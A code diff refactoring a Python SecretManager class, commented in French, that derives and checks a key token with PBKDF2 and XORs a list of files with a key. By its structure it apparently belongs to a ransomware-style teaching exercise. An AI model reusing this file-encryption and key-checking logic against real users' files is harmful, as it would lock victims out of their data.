@@ -15,7 +15,7 @@ from xorcrypt import xorfile
 
 class SecretManager:
 
-    ROOT_PATH = "/root/token"
+    
 
     ITERATION = 48000
     TOKEN_LENGTH = 16
@@ -40,14 +40,15 @@ class SecretManager:
             iterations=self.ITERATION,
             backend = default_backend()
         )
-        return kdf.derive(key) # retoune la clé dérivée
+        derived_key = kdf.derive(key) # dérivation de la clé
+        return derived_key # retoune la clé dérivée
         
 
     def create(self)->Tuple[bytes, bytes, bytes]:
         salt = secrets.token_bytes(self.SALT_LENGTH) # génération d'un sel aléatoire
         key = secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
         token = self.do_derivation(salt, key) # génération du jeton à partir du sel et de la clé
-        return (salt, key, token) # retourne le sel, la clé et le jeton
+        return salt, key, token # retourne le sel, la clé et le jeton
         
 
     def bin_to_b64(self, data:bytes)->str:
@@ -101,23 +102,23 @@ class SecretManager:
         token_path = os.path.join(self._path, "token.bin")
 
         # vérification de l'existence des fichiers de données de chiffrement
-        if not os.path.exists(salt_path) or not os.path.exists(token_path):
-            self._log.info("Les données de chiffrement n'existent pas")
-        else:        
+        if os.path.exists(salt_path) and os.path.exists(token_path):
             # chargement des données de chiffrement
             with open(salt_path, "rb") as salt_f:
                 self._salt = salt_f.read()
             with open(token_path, "rb") as token_f:
                 self._token = token_f.read()
+        else:
+            self._log.info("Les données de chiffrement n'existent pas")
+       
             
             
-
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
         # vérification de la clé
         # génération du jeton à partir du sel et de la clé candidate
-        derived_key = self.do_derivation(self._salt, candidate_key)
-        return derived_key == self._token
+        token = self.do_derivation(self._salt, candidate_key)
+        return token == self._token
 
 
     def set_key(self, b64_key:str)->None:
@@ -137,10 +138,11 @@ class SecretManager:
         #Hacher le token en sha256 et le convertir en hexadécimal
         hashed_token = sha256(self._token).hexdigest()
         return hashed_token
+    
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        self._log.info(files)
+        #self._log.info(files)
         for f_path in files:
             try:
                 xorfile(f_path, self._key)
